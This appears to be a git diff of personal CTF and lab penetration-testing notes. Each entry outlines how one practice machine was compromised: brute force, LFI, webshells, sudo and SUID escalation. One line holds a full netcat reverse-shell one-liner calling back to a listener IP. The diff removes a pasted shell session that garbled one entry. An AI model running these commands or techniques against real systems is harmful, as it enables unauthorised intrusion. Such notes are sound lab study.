@@ -74,28 +74,22 @@ json unsearialize vuln of webapplication, rce; ps -aux to find process is runnin
   bruteforce on admin/ burp is slow, hydra not reliable; burp repeater to modify http request; tomcat setting file,; sudo -l add new user into /etc/passwd
 #### fall
   dirsearch test.php,requires a get parameter; LFI, wfuzz to get the patameter; LFI the passwd and .ssh of bash user; ssh -i id_rsa; history, echo "x" | sudo -S xxx.
+
 #### mercy
   139 share files; knock http and ssh; rcp vunl; tomcat server conf file dirc and user passwd leakage; tomcat .war file reverseshell by msfvenom; root privi of a file;
+
 #### fristlink
   dirc info from page;f12 to view useful info; baes64  to image;php reverseshell with subfix .png; info searching, file rpivi; use rpvi to change privi of folder and files; sudo -l
+
 #### hack_me_please
   view page source code to get hidden file and dirc; find seeddms application; google the setting page and accessible; get the ID and passwd of DB; get host user/passwd and seeddms ID/passwd; update the passwd of DB if cannot crack; vuln of seeddms; sudo -l
+
 #### DerpNStink
   web dirc,wp plugin vuln- get shell; wp-config.php get mysql passwd;mysql get wp-admin login and host account passwd;sudo -l
+
 #### deveguru
   .git didrc leakage, gittool to get the git file by git dumper to download and git extractor to restore to normal files; get the db credential; login web server backend; htm file RCE method, wget reverse shell to load it via web browser; searching for abnormal filistening on [any] 8821 ...
-connect to [10.10.16.17] from (UNKNOWN) [10.129.231.23] 41744
-Linux soulmate 5.15.0-153-generic #163-Ubuntu SMP Thu Aug 7 16:37:18 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
- 07:16:02 up  4:50,  0 users,  load average: 0.00, 0.00, 0.00
-USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
-uid=33(www-data) gid=33(www-data) groups=33(www-data)
 
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-
-www-data@soulmate:/$ cat /etc/passwd | grep bash
-cat /etc/passwd | grep bash
-root:x:0:0:root:/root:/bin/bash
-ben:x:1000:1000:,,,:/home/ben:/bin/bashle - backups; get gitea db credential; gitea githook to launch hook shell(system bash shell); sudo -l sqlite3 but without passwd; sudo version , vuln; sudo -u#-1;
 #### tommyboy
   wp user brute force; photo exiftool to veiw info; hidden port , not always open; fuff to find hidden file on web; crunch to generate word list;fcrackzip to crack zip passwd;wp apperance template fule php reverse shell; find dirc with writable privi;ilovecody112235! 
 
@@ -119,8 +113,10 @@ ben:x:1000:1000:,,,:/home/ben:/bin/bashle - backups; get gitea db credential; gi
   pop3 protocal, telnet to RETR emails; exifitool to view photo hidden info; web reverse shell for system path; kernal exploit, cc replace gcc, if gcc is not allowed;
 #### nullbyte
   index pic exiftool for commit info- that might be passwd, directory, hash or encoded strings; one field input box hydra bruteforce; sqlmap; decoded words, try more methods, you will find the truth; u=s, $PATH to trick the script to run a file located in the current folder, it can be /bin/sh or /bin/bash. with s privi
+
 #### pre-oscp
   id_rsa, ssh -i as oscp; u=s
+
 #### lemonsqueezy
   wpscan id bruteforce; phpmyadmin wrtie command into outfile in query aommand to add a php?cmd= page for remote code execution; crontab to esclate privi
 #### misdirection
@@ -137,6 +133,7 @@ ben:x:1000:1000:,,,:/home/ben:/bin/bashle - backups; get gitea db credential; gi
   sqli like hackme1; c coded , input box, system("id"), indicates developed by C; system(base64_decode("payload") to bypass cannot type blank); rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.178.129 8821 >/tmp/f (nc for revershell cannot user -e);
 #### zico2
   phpLiteAdmin v1.9.3 default passwd admin; exploit  Remote PHP Code Injection to get a shell; enumerate zico home folder/wp-config get host passwd; sudo -l
+
 #### kiopreix2
   web page ping app with python reverse shell toget a shell;kernel vuln
 #### sickos
@@ -367,51 +364,6 @@ http://exfiltrated.offsec/panel.aspx
 Subrion CMS v4.2.1
 
 cannot find practical exploit file. use msf to get shell
-
-#### Lteral move and Privi Escalate
-only find a crontab task 
-```
-# *  *  *  *  * user-name command to be executed
-17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
-25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
-47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
-52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-* *	* * *	root	bash /opt/image-exif.sh
-```
-it is executed by root.
-
-`ls -la /opt/image-exif.sh`
-```
-ls -la /opt/image-exif.sh
--rwxr-xr-x 1 root root 437 Jun 10  2021 /opt/image-exif.sh
-```
-
-`cat /opt/image-exif.sh`
-```
-cat /opt/image-exif.sh
-#! /bin/bash
-#07/06/18 A BASH script to collect EXIF metadata 
-
-echo -ne "\\n metadata directory cleaned! \\n\\n"
-
-
-IMAGES='/var/www/html/subrion/uploads'
-
-META='/opt/metadata'
-FILE=`openssl rand -hex 5`
-LOGFILE="$META/$FILE"
-
-echo -ne "\\n Processing EXIF metadata now... \\n\\n"
-ls $IMAGES | grep "jpg" | while read filename; 
-do 
-    exiftool "$IMAGES/$filename" >> $LOGFILE 
-done
-
-echo -ne "\\n\\n Processing is finished! \\n\\n\\n"
-```
-exiftool ran by root.
-and CVE-2021-22204  https://github.com/bilkoh/POC-CVE-2021-22204
-
 set reverse shell as payload.
 use this exp to generate a jpg file, cp to the dir collected by script. and get root shell, also the user.
 
